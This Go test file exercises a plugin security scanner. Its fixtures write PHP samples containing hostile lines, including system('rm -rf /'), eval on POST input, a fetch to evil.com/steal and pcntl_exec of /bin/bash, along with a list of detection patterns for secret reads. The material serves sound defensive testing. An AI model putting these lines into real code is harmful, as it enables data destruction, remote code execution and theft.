package plugins

import (
	"archive/tar"
	"compress/gzip"
	"io"
	"os"
	"path/filepath"
	"testing"
)

// createTarGz creates a tar.gz archive from a directory (for testing)
func createTarGz(sourceDir, targetPath string) error {
	// Create the target file
	targetFile, err := os.Create(targetPath)
	if err != nil {
		return err
	}
	defer targetFile.Close()

	// Create gzip writer
	gzipWriter := gzip.NewWriter(targetFile)
	defer gzipWriter.Close()

	// Create tar writer
	tarWriter := tar.NewWriter(gzipWriter)
	defer tarWriter.Close()

	// Walk through the source directory
	return filepath.Walk(sourceDir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		// Get relative path
		relPath, err := filepath.Rel(sourceDir, path)
		if err != nil {
			return err
		}

		// Skip if it's the root directory
		if relPath == "." {
			return nil
		}

		// Skip the target archive file itself if it's inside the sourceDir
		if filepath.Clean(path) == filepath.Clean(targetPath) {
			return nil
		}

		// Create header
		header, err := tar.FileInfoHeader(info, relPath)
		if err != nil {
			return err
		}
		header.Name = relPath

		// Write header
		if err := tarWriter.WriteHeader(header); err != nil {
			return err
		}

		// If it's a file, write the content
		if !info.IsDir() {
			file, err := os.Open(path)
			if err != nil {
				return err
			}
			defer file.Close()

			if _, err := io.Copy(tarWriter, file); err != nil {
				return err
			}
		}

		return nil
	})
}

func TestSecurityScanner(t *testing.T) {
	scanner := NewSecurityScanner()

	// Test with a safe plugin
	t.Run("Safe Plugin", func(t *testing.T) {
		// Create a temporary directory with a safe plugin
		tempDir, err := os.MkdirTemp("", "test_safe_plugin_*")
		if err != nil {
			t.Fatalf("Failed to create temp directory: %v", err)
		}
		defer os.RemoveAll(tempDir)

		// Create plugin.yml
		manifestContent := `name: test-plugin
version: 1.0.0
author: Test Author
description: A test plugin
backend: true
routes:
  - path: /hello
    method: GET
    handler: hello_handler
`
		if err := os.WriteFile(filepath.Join(tempDir, "plugin.yml"), []byte(manifestContent), 0644); err != nil {
			t.Fatalf("Failed to write manifest: %v", err)
		}

		// Create a simple WASM file (just a placeholder)
		wasmContent := []byte{0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00} // WASM magic number
		if err := os.WriteFile(filepath.Join(tempDir, "test-plugin.wasm"), wasmContent, 0644); err != nil {
			t.Fatalf("Failed to write WASM file: %v", err)
		}

		// Create archive
		archivePath := filepath.Join(tempDir, "test-plugin.tar.gz")
		if err := createTarGz(tempDir, archivePath); err != nil {
			t.Fatalf("Failed to create archive: %v", err)
		}

		// Scan the plugin
		result, err := scanner.ScanPluginArchive(archivePath)
		if err != nil {
			t.Fatalf("Security scan failed: %v", err)
		}

		// Verify results
		if !result.Safe {
			t.Errorf("Expected plugin to be safe, got unsafe")
		}

		if result.Score < 80 {
			t.Errorf("Expected score >= 80, got %d", result.Score)
		}

		if !result.GalaxySafe {
			t.Errorf("Expected Galaxy Safe badge, got unsafe")
		}

		if result.OverallRisk != "low" {
			t.Errorf("Expected low risk, got %s", result.OverallRisk)
		}
	})

	// Test with a malicious plugin
	t.Run("Malicious Plugin", func(t *testing.T) {
		// Create a temporary directory with a malicious plugin
		tempDir, err := os.MkdirTemp("", "test_malicious_plugin_*")
		if err != nil {
			t.Fatalf("Failed to create temp directory: %v", err)
		}
		defer os.RemoveAll(tempDir)

		// Create plugin.yml with malicious content
		manifestContent := `name: malicious-plugin
version: 1.0.0
author: Malicious Author
description: A malicious plugin
backend: true
routes:
  - path: /evil
    method: POST
    handler: evil_handler
`
		if err := os.WriteFile(filepath.Join(tempDir, "plugin.yml"), []byte(manifestContent), 0644); err != nil {
			t.Fatalf("Failed to write manifest: %v", err)
		}

		// Create a malicious file
		maliciousContent := `<?php
system("rm -rf /");
eval($_POST['code']);
file_get_contents("http://evil.com/steal");
?>`
		if err := os.WriteFile(filepath.Join(tempDir, "malicious.php"), []byte(maliciousContent), 0644); err != nil {
			t.Fatalf("Failed to write malicious file: %v", err)
		}

		// Create a simple WASM file
		wasmContent := []byte{0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00}
		if err := os.WriteFile(filepath.Join(tempDir, "malicious-plugin.wasm"), wasmContent, 0644); err != nil {
			t.Fatalf("Failed to write WASM file: %v", err)
		}

		// Create archive
		archivePath := filepath.Join(tempDir, "malicious-plugin.tar.gz")
		if err := createTarGz(tempDir, archivePath); err != nil {
			t.Fatalf("Failed to create archive: %v", err)
		}

		// Scan the plugin
		result, err := scanner.ScanPluginArchive(archivePath)
		if err != nil {
			t.Fatalf("Security scan failed: %v", err)
		}

		// Verify results
		if result.Safe {
			t.Errorf("Expected plugin to be unsafe, got safe")
		}

		if result.Score >= 50 {
			t.Errorf("Expected score < 50, got %d", result.Score)
		}

		if result.GalaxySafe {
			t.Errorf("Expected not Galaxy Safe, got safe")
		}

		if len(result.Issues) == 0 {
			t.Errorf("Expected security issues, got none")
		}
	})
}

func TestSecurityScannerPatterns(t *testing.T) {
	scanner := NewSecurityScanner()

	// Test malicious patterns
	maliciousPatterns := []string{
		"system('rm -rf /')",
		"eval($_POST['code'])",
		"file_get_contents('http://evil.com')",
		"mysql_connect('localhost', 'user', 'pass')",
		"base64_decode('ZWNobyAiaGVsbG8iOw==')",
		"create_function('$a', 'return $a;')",
		"pcntl_exec('/bin/bash')",
		"getenv('SECRET_KEY')",
		"password=secret123",
	}

	for _, pattern := range maliciousPatterns {
		t.Run("Malicious Pattern: "+pattern, func(t *testing.T) {
			// Create a temporary directory
			tempDir, err := os.MkdirTemp("", "test_pattern_*")
			if err != nil {
				t.Fatalf("Failed to create temp directory: %v", err)
			}
			defer os.RemoveAll(tempDir)

			// Create plugin.yml
			manifestContent := `name: test-pattern
version: 1.0.0
author: Test Author
description: A test plugin
backend: true
routes:
  - path: /test
    method: GET
    handler: test_handler
`
			if err := os.WriteFile(filepath.Join(tempDir, "plugin.yml"), []byte(manifestContent), 0644); err != nil {
				t.Fatalf("Failed to write manifest: %v", err)
			}

			// Create a file with the malicious pattern
			fileContent := `<?php
// Some innocent code
echo "Hello World";
` + pattern + `
// More innocent code
?>`
			if err := os.WriteFile(filepath.Join(tempDir, "test.php"), []byte(fileContent), 0644); err != nil {
				t.Fatalf("Failed to write test file: %v", err)
			}

			// Create WASM file
			wasmContent := []byte{0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00}
			if err := os.WriteFile(filepath.Join(tempDir, "test-pattern.wasm"), wasmContent, 0644); err != nil {
				t.Fatalf("Failed to write WASM file: %v", err)
			}

			// Create archive
			archivePath := filepath.Join(tempDir, "test-pattern.tar.gz")
			if err := createTarGz(tempDir, archivePath); err != nil {
				t.Fatalf("Failed to create archive: %v", err)
			}

			// Scan the plugin
			result, err := scanner.ScanPluginArchive(archivePath)
			if err != nil {
				t.Fatalf("Security scan failed: %v", err)
			}

			// Verify that issues were found
			if len(result.Issues) == 0 {
				t.Errorf("Expected security issues for pattern '%s', got none", pattern)
			}

			// Verify that the score is reduced
			if result.Score >= 100 {
				t.Errorf("Expected reduced score for pattern '%s', got %d", pattern, result.Score)
			}
		})
	}
}
